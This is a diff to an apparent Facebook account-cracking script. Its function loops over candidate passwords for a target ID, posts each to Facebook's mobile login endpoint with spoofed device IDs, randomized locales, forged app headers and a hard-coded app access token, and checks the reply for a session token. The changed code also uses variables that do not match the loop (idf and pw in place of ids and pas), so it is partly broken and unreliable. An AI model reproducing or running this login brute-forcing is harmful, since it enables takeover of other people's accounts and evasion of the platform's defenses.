@@ -970,40 +970,55 @@ def m8(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            info= {'adid':str(uuid.uuid4()),
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
+            info= {
+            'adid':adid,
             'format':'json',
-            'device_id':str(uuid.uuid4()),
-            'email':ids,
-            'password':pas,
+            'device_id':adid,
+            'email':idf,
+            'password':pw,
+            "logged_out_id": str(uuid.uuid4()),
+            "hash_id": str(uuid.uuid4()),
+            "reg_instance": str(uuid.uuid4()),
+            "session_id": str(uuid.uuid4()),
+            "advertiser_id": str(uuid.uuid4()),
             'generate_analytics_claims':'1',
-            'community_id':'',
-            'cpl':'true','try_num':'1',
-            'family_device_id':str(uuid.uuid4()),
             'credentials_type':'password',
             'source':'login',
+            "sim_country": "id",
+            "network_country": "id",
+            "relative_url": "method/auth.login",
             'error_detail_type':'button_with_disabled',
             'enroll_misauth':'false',
             'generate_session_cookies':'1',
             'generate_machine_id':'1',
-            'currently_logged_in_userid':'0',
-            'locale':'en_US',
-            'client_country_code':'US',
+            "locale":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
+            "client_country_code":random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]), 
             'fb_api_req_friendly_name':'authenticate',
-            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
             update={
-            "User-Agent": uax,
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            'Authorization':f'OAuth {accessToken}',
+            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
             "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-Connection-Quality": "EXCELLENT",
-            "X-FB-Connection-Type": "MOBILE.LTE",
-            "X-FB-HTTP-Engine": "Liger",
-            'X-FB-Client-IP': 'True',
-            "X-FB-Friendly-Name": "authenticate",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Content-Length": str(len(content_lenght))}
+            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-FB-device-group': str(random.randint(2000, 4000)),
+            "X-FB-Friendly-Name": "ViewerReactionsMutation",
+            "X-FB-Request-Analytics-Tags": "graphservice",
+            'X-FB-Friendly-Name':'authenticate',
+            'X-FB-Connection-Type':'unknown',
+            'X-FB-connection-quality':'EXCELLENT',
+            "X-Tigon-Is-Retry": "False",
+            'User-Agent':'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162189;FBDM/{density=2.625,width=1080,height=2123};FBLC/tr_TR;FBRV/525469090;FB_FW/2;FBCR/TM CELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N986B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
+            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
+            'Accept-Encoding':'gzip, deflate',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            "X-FB-Client-IP": "True",
+            "X-FB-Server-Cluster": "True",
+            'X-FB-HTTP-Engine': 'Liger'}
             url = 'https://m.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
